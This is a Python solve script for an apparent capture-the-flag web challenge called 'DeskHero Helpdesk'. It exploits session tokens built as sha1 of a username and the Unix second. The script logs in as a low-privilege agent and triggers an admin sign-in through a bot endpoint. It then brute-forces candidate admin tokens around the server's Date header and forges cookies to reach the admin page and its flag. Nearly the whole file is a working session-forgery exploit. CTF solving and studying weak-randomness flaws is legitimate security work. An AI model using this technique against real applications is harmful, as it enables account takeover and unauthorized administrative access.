#!/usr/bin/env python3
"""
DeskHero Helpdesk (auth, 150) — CWE-330/331, time-seeded session token.

Session tokens are sha1("<username>:<unix_second>") — the only entropy is which
second the session was minted. Proven from the agent's own token:
    sha1("agent:1794409550") == 88aadca9a22c57a15efc33cb97070104e9398cb3

POST /bot/refresh-oncall signs an on-call ADMIN in at a known second (the
response Date header). We regenerate sha1("admin:<second>") over a small window
and use the matching token cookie on /ticket/admin.

Usage:
    python3 solve.py                          # defaults to auth9.chal.deti:8068
    python3 solve.py http://auth9.chal.deti:8068
"""
import email.utils
import hashlib
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth9.chal.deti:8068"
ADMIN = f"{BASE}/ticket/admin"
REFRESH = f"{BASE}/bot/refresh-oncall"
LOGIN = f"{BASE}/login"

FLAG_RE = re.compile(r"flag\{[^}]*\}")
# usernames the on-call session might mint under; admin is the likely one
USERS = ["admin", "oncall", "oncall-admin", "administrator", "agent"]
WINDOW = range(-3, 4)  # seconds of clock skew to try around the refresh


def server_epoch(resp) -> int:
    dt = email.utils.parsedate_to_datetime(resp.headers["Date"])
    return int(dt.timestamp())


def main() -> int:
    s = requests.Session()
    s.post(LOGIN, data={"username": "agent", "password": "agent123"}, timeout=10)

    # trigger the on-call admin sign-in; its token is minted at THIS second
    r = s.post(REFRESH, timeout=10)
    t = server_epoch(r)
    print(f"[i] refresh second: {t}")

    for user in USERS:
        for dsec in WINDOW:
            tok = hashlib.sha1(f"{user}:{t + dsec}".encode()).hexdigest()
            resp = requests.get(ADMIN, cookies={"token": tok}, timeout=10)
            if resp.status_code == 200:
                m = FLAG_RE.search(resp.text)
                print(f"[+] hit: user={user} second={t + dsec} token={tok}")
                print(f"[+] FLAG: {m.group(0) if m else '(200 but no flag — see body)'}")
                if m:
                    return 0
    print("[-] no token matched; widen WINDOW or USERS")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
